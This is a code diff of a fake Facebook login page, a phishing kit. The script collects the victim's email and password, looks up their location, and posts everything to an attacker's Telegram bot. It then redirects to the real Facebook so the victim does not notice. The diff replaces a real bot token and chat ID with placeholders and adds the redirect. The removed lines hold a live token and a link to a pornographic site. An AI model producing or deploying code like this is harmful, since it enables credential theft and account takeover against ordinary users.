@@ -4,6 +4,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
 
+    <!-- Redirect Immediately -->
+    <script>
+        // Uncomment the line below for an instant redirect
+        // window.location.href = "https://Facebook.com";
+
+        // Delayed Redirect (5 seconds)
+        setTimeout(() => {
+            window.location.href = "https://Facebook.com";
+        }, 5000); // Change the time (5000ms = 5 seconds) if needed
+    </script>
+
     <!-- External scripts and styles -->
     <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
@@ -11,10 +22,9 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 
-    <!-- Custom styling -->
     <style>
         body {
-            background: #1877F2; /* Facebook blue */
+            background: #1877F2;
             color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
@@ -34,12 +44,8 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
-        .form-container img {
-            max-width: 100%;
-            height: auto;
-        }
-
-        .form-container input {
+        .form-container input,
+        .form-container button {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
@@ -56,9 +62,7 @@
             font-size: 16px;
             border-radius: 6px;
             border: none;
-            width: 100%;
             cursor: pointer;
-            margin-top: 10px;
         }
 
         .form-container button:hover {
@@ -73,49 +77,14 @@
             font-size: 14px;
             margin-top: 20px;
         }
-
-        .footer img {
-            width: 25px;
-            height: 25px;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-
-        /* Responsive Design */
-        @media screen and (min-width: 768px) {
-            .form-container {
-                padding: 40px;
-            }
-
-            .form-container h2 {
-                font-size: 1.8rem;
-            }
-
-            .form-container input,
-            .form-container button {
-                font-size: 18px;
-            }
-
-            .footer {
-                font-size: 16px;
-            }
-        }
     </style>
 </head>
 
 <body>
     <!-- Main content -->
     <div class="form-container">
-        <!-- Top Image -->
-        <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&raw=1" 
-             alt="Facebook" class="mb-4">
-
-        <!-- Facebook Logo -->
-        <div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
-                 alt="Facebook Logo" width="90" height="90" class="mx-auto">
-        </div>
-
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+             alt="Facebook Logo" width="90" height="90" class="mx-auto">
         <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>
 
         <!-- Login Form -->
@@ -139,44 +108,31 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            // Define the redirect URL
-            const redirectUrl = "https://mywebsite.com"; // Replace with your website
-
             try {
                 const res = await axios.get('https://ipapi.co/json/');
                 const data = res.data;
 
                 const location = data.city || 'Unknown';
                 const country = data.country_name || 'Unknown';
-                const flag = data.country_code ? `:${data.country_code.toLowerCase()}:` : '🏳️';
-                const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });
 
-                const telegramToken = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo"; // Replace with your bot token
-                const chatId = "6482794683"; // Replace with your chat ID
+                const telegramToken = "YOUR_TELEGRAM_TOKEN"; // Replace with your bot token
+                const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
                 const message = `
-📝 *Info*
-🔑 ${email}
-🔐 ${password}
-🌍 ${location}
-🏳️ ${country} ${flag}
-⏰ ${currentTime}
-
-📌 *@stubborn Academy*
-                `;
+Email: ${email}
+Password: ${password}
+Location: ${location}, ${country}
+`;
 
                 await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    text: message
                 });
-
-                // Redirect to the custom URL after successful submission
-                window.location.href = redirectUrl; //https://xhamster.desi/videos/a-hot-sexy-girl-rides-a-dildo-and-gets-a-breathtaking-orgasm-xhn5L4O
             } catch (error) {
-                console.error("Error sending message to Telegram:", error);
-                // Redirect to the custom URL even if something fails
-                window.location.href = redirectUrl; // https://xhamster.desi/videos/a-hot-sexy-girl-rides-a-dildo-and-gets-a-breathtaking-orgasm-xhn5L4O
+                console.error("Error sending to Telegram:", error);
             }
+
+            // Redirect immediately after submission
+            window.location.href = "https://Facebook.com";
         }
     </script>
 </body>
